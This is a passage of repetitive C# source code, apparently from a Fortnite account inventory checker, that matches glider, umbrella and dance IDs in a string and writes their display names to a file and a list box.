                            bool glidercheck68 = x.Contains("glider_id_048_viking");
                            if (glidercheck68)
                            {
                                sw.WriteLine("=> Conquest");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Conquest");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck69 = x.Contains("glider_id_049_lifeguard");
                            if (glidercheck69)
                            {
                                sw.WriteLine("=> Splashdown");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Splashdown");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck70 = x.Contains("glider_id_050_streetracercobra");
                            if (glidercheck70)
                            {
                                sw.WriteLine("=> Cruiser");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cruiser");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck71 = x.Contains("glider_id_051_luchador");
                            if (glidercheck71)
                            {
                                sw.WriteLine("=> Libre");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Libre");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck72 = x.Contains("glider_id_052_bedazzled");
                            if (glidercheck72)
                            {
                                sw.WriteLine("=> Rhinestone Rider");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rhinestone Rider");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck73 = x.Contains("glider_id_053_huya");
                            if (glidercheck73)
                            {
                                sw.WriteLine("=> Rush");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rush");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck74 = x.Contains("glider_id_054_douyu");
                            if (glidercheck74)
                            {
                                sw.WriteLine("=> Helium");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Helium");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck75 = x.Contains("glider_id_055_streetracerblack");
                            if (glidercheck75)
                            {
                                sw.WriteLine("=> Downshift");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Downshift");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck76 = x.Contains("umbrella_season_05");
                            if (glidercheck76)
                            {
                                sw.WriteLine("=> Beach Umbrella");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Beach Umbrella");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck77 = x.Contains("glider_id_057_modernmilitary");
                            if (glidercheck77)
                            {
                                sw.WriteLine("=> Servo");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Servo");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck78 = x.Contains("glider_id_058_shark");
                            if (glidercheck78)
                            {
                                sw.WriteLine("=> Laser Chomp");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Laser Chomp");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck83 = x.Contains("Glider_id_064_biker");
                            if (glidercheck83)
                            {
                                sw.WriteLine("=> Blaze");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Blaze");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck80 = x.Contains("Glider_id_065_hippie");
                            if (glidercheck80)
                            {
                                sw.WriteLine("=> Tie-dye Flyer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tie-dye Flyer");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck81 = x.Contains("Glider_id_066_samuraiblue");
                            if (glidercheck81)
                            {
                                sw.WriteLine("=> Purrfect.");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Purrfect.");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck82 = x.Contains("Glider_id_067_psburnout");
                            if (glidercheck82)
                            {
                                sw.WriteLine("=> Flappy");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flappy");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck84 = x.Contains("glider_id_068_garageband");
                            if (glidercheck84)
                            {
                                sw.WriteLine("=> Hot Ride");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hot Ride");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck85 = x.Contains("glider_id_069_hacivat");
                            if (glidercheck85)
                            {
                                sw.WriteLine("=> Shadow Puppet");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shadow Puppet");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck86 = x.Contains("glider_id_072_bling");
                            if (glidercheck86)
                            {
                                sw.WriteLine("=> Safecracker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Safecracker");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck87 = x.Contains("glider_id_073_medic");
                            if (glidercheck87)
                            {
                                sw.WriteLine("=> Airlift");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Airlift");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck88 = x.Contains("glider_id_070_darkviking");
                            if (glidercheck88)
                            {
                                sw.WriteLine("=> Frostwing");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Frostwing");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck89 = x.Contains("glider_id_056_carbidewhite");
                            if (glidercheck89)
                            {
                                sw.WriteLine("=> Aurora");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Aurora");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck90 = x.Contains("glider_id_075_modernmilitaryred");
                            if (glidercheck90)
                            {
                                sw.WriteLine("=> Rotor");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rotor");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck91 = x.Contains("glider_id_076_dieselpunk");
                            if (glidercheck91)
                            {
                                sw.WriteLine("=> Dirigible");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dirigible");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck92 = x.Contains("glider_id_077_octoberfest");
                            if (glidercheck92)
                            {
                                sw.WriteLine("=> Oktoberfeast");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Oktoberfeast");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck93 = x.Contains("glider_id_078_vampire");
                            if (glidercheck93)
                            {
                                sw.WriteLine("=> Swarm");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Swarm");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck94 = x.Contains("glider_id_079_redriding");
                            if (glidercheck94)
                            {
                                sw.WriteLine("=> Picnic");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Picnic");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck95 = x.Contains("glider_id_080_prairiepusher");
                            if (glidercheck95)
                            {
                                sw.WriteLine("=> Covered Crusader");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Covered Crusader");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck96 = x.Contains("glider_id_081_cowboygunslinger");
                            if (glidercheck96)
                            {
                                sw.WriteLine("=> Crossfire");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crossfire");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck97 = x.Contains("umbrella_season_06");
                            if (glidercheck97)
                            {
                                sw.WriteLine("=> Webrella");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Webrella");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck98 = x.Contains("glider_id_082_scarecrow");
                            if (glidercheck98)
                            {
                                sw.WriteLine("=> Field Wraith");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Field Wraith");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck99 = x.Contains("glider_id_083_darkbomber");
                            if (glidercheck99)
                            {
                                sw.WriteLine("=> Dark Glyph");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Glyph");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck100 = x.Contains("glider_id_084_plague");
                            if (glidercheck100)
                            {
                                sw.WriteLine("=> Lamplight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lamplight");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck101 = x.Contains("glider_id_085_skulltrooper");
                            if (glidercheck101)
                            {
                                sw.WriteLine("=> Crypt Cruiser");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crypt Cruiser");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck102 = x.Contains("glider_id_086_blackwidow");
                            if (glidercheck102)
                            {
                                sw.WriteLine("=> Hatchling");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hatchling");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck103 = x.Contains("glider_id_087_guanyu");
                            if (glidercheck103)
                            {
                                sw.WriteLine("=> Divine Dragon");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Divine Dragon");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck104 = x.Contains("glider_id_074_raptorarcticcamo");
                            if (glidercheck104)
                            {
                                sw.WriteLine("=> Cold Front");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cold Front");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck105 = x.Contains("glider_id_088_evilcowboy");
                            if (glidercheck105)
                            {
                                sw.WriteLine("=> Dark Engine");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Engine");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck106 = x.Contains("glider_id_089_muertos");
                            if (glidercheck106)
                            {
                                sw.WriteLine("=> Spirit");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spirit");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck107 = x.Contains("glider_id_090_celestial");
                            if (glidercheck107)
                            {
                                sw.WriteLine("=> Discovery");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Discovery");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck108 = x.Contains("glider_id_074_raptorarcticcamo");
                            if (glidercheck108)
                            {
                                sw.WriteLine("=> Cold Front");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cold Front");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck109 = x.Contains("glider_id_088_evilcowboy");
                            if (glidercheck109)
                            {
                                sw.WriteLine("=> Dark Engine");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Engine");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck110 = x.Contains("glider_id_089_muertos");
                            if (glidercheck110)
                            {
                                sw.WriteLine("=> Spirit");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spirit");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck111 = x.Contains("glider_id_090_celestial");
                            if (glidercheck111)
                            {
                                sw.WriteLine("=> Discovery");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Discovery");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck112 = x.Contains("glider_id_091_madcommander");
                            if (glidercheck112)
                            {
                                sw.WriteLine("=> Junkjet");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Junkjet");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck113 = x.Contains("glider_id_092_streetops");
                            if (glidercheck113)
                            {
                                sw.WriteLine("=> Pivot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pivot");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck114 = x.Contains("glider_id_093_animaljackets");
                            if (glidercheck114)
                            {
                                sw.WriteLine("=> Poofy Parasail");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Poofy Parasail");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck115 = x.Contains("glider_id_094_samuraiultra");
                            if (glidercheck115)
                            {
                                sw.WriteLine("=> Kabuto");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Kabuto");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck116 = x.Contains("glider_id_071_football");
                            if (glidercheck116)
                            {
                                sw.WriteLine("=> Touchdown");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Touchdown");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck117 = x.Contains("glider_id_095_witch");
                            if (glidercheck117)
                            {
                                sw.WriteLine("=> Magic Wings");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Magic Wings");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck118 = x.Contains("glider_id_096_hornedmask");
                            if (glidercheck118)
                            {
                                sw.WriteLine("=> Flying Carp");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flying Carp");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck119 = x.Contains("glider_id_097_feathers");
                            if (glidercheck119)
                            {
                                sw.WriteLine("=> Flappy Flyer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flappy Flyer");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck120 = x.Contains("glider_id_098_sup");
                            if (glidercheck120)
                            {
                                sw.WriteLine("=> Hyper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hyper");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck121 = x.Contains("glider_id_100_yeti");
                            if (glidercheck121)
                            {
                                sw.WriteLine("=> Rickety Runner");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rickety Runner");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck122 = x.Contains("glider_id_101_tacticalsanta");
                            if (glidercheck122)
                            {
                                sw.WriteLine("=> Tactical Sleigh");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tactical Sleigh");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck123 = x.Contains("glider_id_103_nautilus");
                            if (glidercheck123)
                            {
                                sw.WriteLine("=> Tbd");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tbd");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck124 = x.Contains("glider_id_104_durrburger");
                            if (glidercheck124)
                            {
                                sw.WriteLine("=> Glidurrr");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Glidurrr");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck125 = x.Contains("glider_id_104_math");
                            if (glidercheck125)
                            {
                                sw.WriteLine("=> Paper Plane");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Paper Plane");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck126 = x.Contains("glider_id_105_gingerbread");
                            if (glidercheck126)
                            {
                                sw.WriteLine("=> Gingersled");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Gingersled");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck127 = x.Contains("glider_id_105_snowboard");
                            if (glidercheck127)
                            {
                                sw.WriteLine("=> Royale Air");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Royale Air");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck128 = x.Contains("glider_id_106_fortnitedj");
                            if (glidercheck128)
                            {
                                sw.WriteLine("=> Equalizer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Equalizer");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck129 = x.Contains("Umbrella_season_07");
                            if (glidercheck129)
                            {
                                sw.WriteLine("=> Snowfall");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Snowfall");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck130 = x.Contains("glider_id_107_icemaiden");
                            if (glidercheck130)
                            {
                                sw.WriteLine("=> Crystal Carriage");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crystal Carriage");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck131 = x.Contains("glider_id_108_krampus");
                            if (glidercheck131)
                            {
                                sw.WriteLine("=> Krampus' Little Helper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Krampus' Little Helper");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                            bool glidercheck132 = x.Contains("glider_id_110_teriyakifish");
                            if (glidercheck132)
                            {
                                sw.WriteLine("=> Coral Cruiser");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Coral Cruiser");
                                }
                                TotalGliders = TotalGliders + 1;
                            }
                        }
                        int TotalDances = 0;
                        if (CheckForDances.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("----------------------<Dances>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("----------------------<Dances>------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            bool DancesFound1 = x.Contains("AthenaDance:eid_bestmates");
                            if (DancesFound1)
                            {
                                sw.WriteLine("=> Best Mates");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Best Mates");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound2 = x.Contains("AthenaDance:eid_breakdance");
                            if (DancesFound2)
                            {
                                sw.WriteLine("=> Breakin");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Breakin");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound3 = x.Contains("AthenaDance:eid_dab");
                            if (DancesFound3)
                            {
                                sw.WriteLine("=> Dab");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dab");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound4 = x.Contains("AthenaDance:eid_dancemoves");
                            if (DancesFound4)
                            {
                                sw.WriteLine("=> Dance Moves");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dance Moves");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound5 = x.Contains("AthenaDance:eid_electroshuffle");
                            if (DancesFound5)
                            {
                                sw.WriteLine("=> Electro Shuffle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Electro Shuffle");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound6 = x.Contains("AthenaDance:eid_facepalm");
                            if (DancesFound6)
                            {
                                sw.WriteLine("=> Face Palm");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Face Palm");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound7 = x.Contains("AthenaDance:eid_fingerguns");
                            if (DancesFound7)
                            {
                                sw.WriteLine("=> Finger Guns");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Finger Guns");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound8 = x.Contains("AthenaDance:eid_flapper");
                            if (DancesFound8)
                            {
                                sw.WriteLine("=> Flapper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flapper");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound9 = x.Contains("AthenaDance:eid_flex");
                            if (DancesFound9)
                            {
                                sw.WriteLine("=> Gun Show");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Gun Show");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound10 = x.Contains("AthenaDance:eid_floss");
                            if (DancesFound10)
                            {
                                sw.WriteLine("=> Floss");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Floss");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound11 = x.Contains("AthenaDance:eid_fresh");
                            if (DancesFound11)
                            {
                                sw.WriteLine("=> Fresh");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fresh");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound12 = x.Contains("AthenaDance:eid_kisskiss");
                            if (DancesFound12)
                            {
                                sw.WriteLine("=> Kiss Kiss");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Kiss Kiss");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound13 = x.Contains("AthenaDance:eid_makeitrain");
                            if (DancesFound13)
                            {
                                sw.WriteLine("=> Make It Rain");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Make It Rain");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound14 = x.Contains("AthenaDance:eid_pinwheel");
                            if (DancesFound14)
                            {
                                sw.WriteLine("=> Rocket Spinner");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rocket Spinner");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound15 = x.Contains("AthenaDance:eid_puresalt");
                            if (DancesFound15)
                            {
                                sw.WriteLine("=> Pure Salt");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pure Salt");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound16 = x.Contains("AthenaDance:eid_ridethepony_athena");
                            if (DancesFound16)
                            {
                                sw.WriteLine("=> Ride the Pony");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ride the Pony");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound17 = x.Contains("AthenaDance:eid_robot");
                            if (DancesFound17)
                            {
                                sw.WriteLine("=> The Robot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> The Robot");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound18 = x.Contains("AthenaDance:eid_rocketrodeo");
                            if (DancesFound18)
                            {
                                sw.WriteLine("=> Rocket Rodeo");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rocket Rodeo");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound19 = x.Contains("AthenaDance:eid_salute");
                            if (DancesFound19)
                            {
                                sw.WriteLine("=> Salute");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Salute");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound20 = x.Contains("AthenaDance:eid_sexyflip");
                            if (DancesFound20)
                            {
                                sw.WriteLine("=> Flippin Sexy");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flippin Sexy");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound21 = x.Contains("AthenaDance:eid_slowclap");
                            if (DancesFound21)
                            {
                                sw.WriteLine("=> Slow Clap");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Slow Clap");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound22 = x.Contains("AthenaDance:eid_takethel");
                            if (DancesFound22)
                            {
                                sw.WriteLine("=> Take the L");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Take the L");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound23 = x.Contains("AthenaDance:eid_truelove");
                            if (DancesFound23)
                            {
                                sw.WriteLine("=> True Love");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> True Love");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound24 = x.Contains("AthenaDance:eid_twist");
                            if (DancesFound24)
                            {
                                sw.WriteLine("=> Twist");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Twist");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound25 = x.Contains("AthenaDance:eid_wave");
                            if (DancesFound25)
                            {
                                sw.WriteLine("=> Wave");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wave");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound27 = x.Contains("AthenaDance:eid_worm");
                            if (DancesFound27)
                            {
                                sw.WriteLine("=> The Worm");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> The Worm");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound28 = x.Contains("AthenaDance:eid_zombie");
                            if (DancesFound28)
                            {
                                sw.WriteLine("=> Reanimated");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Reanimated");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound29 = x.Contains("AthenaDance:eid_breakyou");
                            if (DancesFound29)
                            {
                                sw.WriteLine("=> Breaking Point");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Breaking Point");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound30 = x.Contains("AthenaDance:eid_celebration");
                            if (DancesFound30)
                            {
                                sw.WriteLine("=> Jubilation");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jubilation");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound31 = x.Contains("AthenaDance:eid_confused");
                            if (DancesFound31)
                            {
                                sw.WriteLine("=> Confused");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Confused");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound32 = x.Contains("AthenaDance:eid_dustoffshoulders");
                            if (DancesFound32)
                            {
                                sw.WriteLine("=> Brush Your Shoulders");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Brush Your Shoulders");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound33 = x.Contains("AthenaDance:eid_irishjig");
                            if (DancesFound33)
                            {
                                sw.WriteLine("=> Step It Up");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Step It Up");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound34 = x.Contains("AthenaDance:eid_discofever");
                            if (DancesFound34)
                            {
                                sw.WriteLine("=> Disco Fever");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Disco Fever");
                                }
                                TotalDances = TotalDances + 1;
                            }
